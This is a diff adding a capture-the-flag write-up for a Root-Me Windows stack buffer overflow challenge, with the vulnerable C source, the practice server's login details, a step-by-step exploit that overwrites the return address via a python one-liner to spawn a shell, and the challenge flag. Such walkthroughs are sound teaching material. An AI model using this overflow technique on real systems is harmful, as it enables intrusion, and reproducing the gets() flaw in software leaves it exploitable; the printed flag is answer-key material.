@@ -453,6 +453,185 @@ B33r1sSoG0oD4y0urBr4iN
 
 ---
 
+## PE32 Stack buffer overflow basic
+
+- Author: Ech0
+- Date: 3 December 2019
+- Points: 10
+- Level: 1
+
+### Statement
+
+A simple local buffer overflow.
+
+<details>
+
+<summary markdown="span">Source Code</summary>
+
+~~~c
+    #include <stdio.h>
+    #include <stdlib.h>
+    #include <unistd.h>
+    #include <ctype.h>
+     
+    #define DEFAULT_LEN 16
+     
+    void admin_shell(void)
+    {
+            system("C:\\Windows\\system32\\cmd.exe");
+    }
+     
+    int main(void)
+    {
+            char buff[DEFAULT_LEN] = {0};
+     
+            gets(buff);
+            for (int i = 0; i < DEFAULT_LEN; i++) {
+                    buff[i] = toupper(buff[i]);
+            }
+            printf("%s\n", buff);
+    }
+~~~
+
+</details>
+
+### Connection Details
+
+- Host: challenge05.root-me.org
+- Protocol: SSH
+- Port:2225
+- SSH access: ssh -p 2225 app-systeme-ch72@challenge05.root-me.org 
+- Username: app-systeme-ch72
+- Password: app-systeme-ch72
+
+### Resources
+
+1. [Stack Bug - Exmploit writing tutorial part 1 stack based overflows](https://repository.root-me.org/Exploitation%20-%20Syst%C3%A8me/Microsoft/EN%20-%20Stack%20Bug%20-%20Exploit%20writing%20tutorial%20part%201%20stack%20based%20overflows.pdf).
+2. [Stack Bug - Exmploit writing tutorial part 2 stack based overflows](https://repository.root-me.org/Exploitation%20-%20Syst%C3%A8me/Microsoft/EN%20-%20Stack%20Bug%20-%20Exploit%20writing%20tutorial%20part%202%20%20Stack%20Based%20Overflows%20%E2%80%93%20jumping%20to%20shellcode.pdf).
+3. [Corelan.be - exploiting writing tutorial part 1](https://repository.root-me.org/Exploitation%20-%20Syst%C3%A8me/Microsoft/EN%20-%20Corelan.be%20-%20Exploiting%20writing%20tutorial%20part1%20-%20Stack%20based%20overflows.pdf).
+
+### Solutions
+
+<details>
+
+<summary markdown="span">Solution</summary>
+
+Reviewing the source code we can see the vulnerability in the buff variable:
+
+~~~c
+#define DEFAULT_LEN 16
+...
+char buff[DEFAULT_LEN] = {0};
+gets(buff);
+~~~
+
+The first 16 characters are translated to uppoer case characters in a for loop and the buff variable is printed:
+
+~~~c
+for (int i = 0; i < DEFAULT_LEN; i++) {
+    buff[i] = toupper(buff[i]);
+}
+printf("%s\n", buff);
+~~~
+
+We can connect to the challenge server and test the output:
+
+~~~shell
+$ ssh -p 2225 app-systeme-ch72@challenge05.root-me.org
+app-systeme-ch72@challenge05:~$ ls
+ch72.c  ch72.exe  ch72.obj  exploit.sh  Makefile  wrapper.sh
+app-systeme-ch72@challenge05:~$ ./ch72.exe
+abcd
+ABCD
+app-systeme-ch72@challenge05:~$ ./ch72.exe
+abcdefghijklmnopqrstuvwxyz
+ABCDEFGHIJKLMNOP
+Segmentation fault
+~~~
+
+We can see the buffer overflow exists but we need to identify the stack addresses and the call to the admin_shell function.  We can download the exe file:
+
+~~~shell
+$ scp -P 2225 app-systeme-ch72@challenge05.root-me.org:ch72.exe ~/Downloads/
+      _           _ _                        ___  ____  
+  ___| |__   __ _| | | ___ _ __   __ _  ___ / _ \| ___| 
+ / __| '_ \ / _` | | |/ _ \ '_ \ / _` |/ _ \ | | |___ \ 
+| (__| | | | (_| | | |  __/ | | | (_| |  __/ |_| |___) |
+ \___|_| |_|\__,_|_|_|\___|_| |_|\__, |\___|\___/|____/ 
+                                 |___/ root-me.org      
+
+app-systeme-ch72@challenge05.root-me.org's password: 
+ch72.exe                                                                                                                                                                                                    100%  104KB 977.1KB/s   00:00    
+$ ls
+ch72.exe
+~~~
+
+Using a windows disassembler, we can find the buffer and padding at EBP-14.  The admin_shell command is at 0x401000 (EIP), 24 Bytes after the buffer.  We can submit a buffer to the program using python with 24 characters and little-endian memory address for the admin_shell command:
+
+~~~shell
+app-systeme-ch72@challenge05:~$ (python -c 'print(24*"a"+"\x00\x10\x40\x00")'; cat) | ./ch72.exe
+AAAAAAAAAAAAAAAA
+Microsoft Windows [Version 10.0.17763.737]
+(c) 2018 Microsoft Corporation. All rights reserved.
+
+C:\cygwin64\challenge\app-systeme\ch72>ls -al
+ls -al
+total 126
+dr-xr-x---+ 1 root Users               0 Dec 12 09:54 .
+drwx---r-x+ 1 root None                0 Dec  2  2019 ..
+-r--------  1 root Administrators   1862 Dec 12 09:50 ._perms
+-rw-r-----  1 root Administrators     44 Dec 12 09:25 .git
+-rw-r-----+ 1 root Administrators     33 Dec  3  2019 .passwd
+drwx------+ 1 root Users               0 Oct  6  2019 .ssh
+-rw-r-----  1 root Users             336 Dec  2  2019 ch72.c
+-rwxr-x---+ 1 root Users          105984 Dec  3  2019 ch72.exe
+-rwxr-x---  1 root Users            1550 Dec  3  2019 ch72.obj
+----------+ 1 root None              175 Oct  5  2019 exploit.sh
+-rw-------+ 1 root None              233 Mar 27  2019 Makefile
+-rwxr-x---+ 1 root Users             135 Dec  3  2019 wrapper.sh
+~~~
+
+We are now in the windows shell and can attempt to view the .passwd file:
+
+~~~shell
+C:\cygwin64\challenge\app-systeme\ch72>cat .passwd
+ cat .passwd
+'cat' is not recognized as an internal or external command,
+operable program or batch file.
+~~~
+
+We cannot use cat, if we exit and try the ./wrapper.sh function, this may enable the use of the cat command in the windows shell:
+
+~~~shell
+app-systeme-ch72@challenge05:~$ (python -c 'print(24*"a"+"\x00\x10\x40\x00")'; cat) | ./wrapper.sh
+Microsoft Windows [Version 10.0.17763.737]
+(c) 2018 Microsoft Corporation. All rights reserved.
+
+C:\cygwin64\challenge\app-systeme\ch72>cat .passwd
+cat .passwd
+466aa7907db65a182fe0cc97931388c7
+~~~
+  
+</details>
+
+### Answer
+
+<details>
+
+<summary markdown="span">Answer</summary>
+
+~~~
+466aa7907db65a182fe0cc97931388c7
+~~~
+
+</details>
+
+---
+
+### [App - System](#contents) | [Root-Me](./rootme.md) | [Home](./index.md)
+
+---
+     
 ## ELF x86 Format string bug basic 1
 
 - Author: Lu33Y
@@ -547,7 +726,7 @@ B33r1sSoG0oD4y0urBr4iN
 
 ### [App - System](#contents) | [Root-Me](./rootme.md) | [Home](./index.md)
 
----    
+---
 
 Last updated April 2022.
 
